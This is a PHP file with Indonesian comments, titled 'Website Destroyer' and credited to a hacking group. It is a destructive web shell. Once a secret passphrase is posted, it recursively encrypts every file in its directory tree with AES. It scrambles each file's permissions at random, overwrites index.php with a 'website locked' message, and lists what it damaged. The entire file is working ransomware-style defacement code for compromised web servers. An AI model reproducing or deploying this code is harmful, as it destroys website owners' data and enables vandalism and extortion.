<?php
session_start();

$current_file = basename(__FILE__); // Nama file PHP ini (misalnya 'perusak_site.php')
$directory = __DIR__; // Direktori tempat file ini berada
$encryption_key = 'your-encryption-key'; // Ganti dengan kunci enkripsi yang kuat
$secret_prompt = 'KEHANCURAN'; // Prompt rahasia penghancuran yang benar

// Fungsi untuk mengenkripsi konten file
function encrypt_file($file_path, $key, $current_file) {
    try {
        // Abaikan file ini agar tidak terenkripsi
        if (basename($file_path) === $current_file) {
            return true; // Lewati file ini
        }

        $content = file_get_contents($file_path);
        if ($content === false) {
            throw new Exception('Gagal membaca file');
        }

        $encrypted_content = openssl_encrypt($content, 'aes-256-cbc', $key, 0, substr($key, 0, 16));
        if ($encrypted_content === false) {
            throw new Exception('Enkripsi gagal');
        }

        $result = file_put_contents($file_path, $encrypted_content);
        if ($result === false) {
            throw new Exception('Gagal menyimpan file terenkripsi');
        }

        // Mengacak dan mengganti chmod file secara acak
        chmod($file_path, rand(0, 0777));

        return true; // Enkripsi berhasil
    } catch (Exception $e) {
        return false; // Enkripsi gagal
    }
}

// Fungsi untuk mengenkripsi file dan folder di direktori yang sama
function encrypt_directory($dir, $key, $current_file) {
    $files = scandir($dir);
    $result = [];

    foreach ($files as $file) {
        $full_path = $dir . DIRECTORY_SEPARATOR . $file;

        if ($file != '.' && $file != '..') {
            if (is_file($full_path)) {
                // Enkripsi file yang ada di direktori ini saja, kecuali file ini (current file)
                $status = encrypt_file($full_path, $key, $current_file) ? "(encrypted)" : "(error)";
                $result[] = ['file' => $file, 'status' => $status];
            } elseif (is_dir($full_path)) {
                // Enkripsi folder, jika folder tersebut ada
                encrypt_directory($full_path, $key, $current_file);
            }
        }
    }

    return $result;
}

// Proses "Hancurkan!" untuk enkripsi dan mengganti konten index.php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user_prompt = $_POST['prompt'];

    // Validasi apakah prompt sesuai
    if (strtoupper($user_prompt) == $secret_prompt) {
        // Enkripsi seluruh file di direktori ini dan tampilkan status
        $encryption_status = encrypt_directory($directory, $encryption_key, $current_file);

        // Ganti konten index.php dengan tampilan terkunci (misalnya halaman hancur)
        file_put_contents('index.php', '<?php echo "Website Terkunci!"; ?>');

        // Menampilkan hasil status enkripsi untuk setiap file
        echo '<h2>Daftar Status Enkripsi:</h2>';
        echo '<ul>';
        foreach ($encryption_status as $file_info) {
            $status_class = $file_info['status'] === "(encrypted)" ? 'style="color:red"' : '';
            echo "<li {$status_class}>{$file_info['file']} {$file_info['status']}</li>";
        }
        echo '</ul>';

        exit;
    } else {
        echo 'Prompt salah! Akses ditolak.';
    }
}

?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Destroyer</title>
    <style>
        body {
            background-color: #8B0000; /* Merah Darah */
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .logo {
            width: 150px;
            height: auto;
            margin-top: 30px;
        }

        h1 {
            font-size: 50px;
        }

        h2 {
            color: #FF0000;
        }

        .footer {
            margin-top: 30px;
            font-size: 18px;
        }

        .footer a {
            color: #FF4500;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        input[type="text"] {
            padding: 10px;
            font-size: 16px;
            margin: 10px 0;
            width: 80%;
            max-width: 300px;
        }

        button {
            background-color: #FF4500;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 18px;
        }

        button:hover {
            background-color: #FF6347;
        }
    </style>
</head>
<body>
    <!-- Logo Tengkorak Bhaya -->
    <img src="https://i.ibb.co/Lhpd1TT/download-removebg-preview.png" alt="Skull Logo" class="logo">

    <h1>Website Destroyer</h1>

    <!-- Form untuk input prompt rahasia penghancuran -->
    <form method="POST" action="">
        <label for="prompt">Masukkan prompt rahasia penghancuran:</label><br>
        <input type="text" name="prompt" id="prompt" required><br><br>
        <button type="submit">Hancurkan!</button>
    </form>

    <div class="footer">
        <p>Created by Fidzxploit - Indohaxsec Team</p>
        <p><a href="https://github.com/INDOHAXSEC" target="_blank">Visit our GitHub</a></p>
    </div>
</body>
</html>
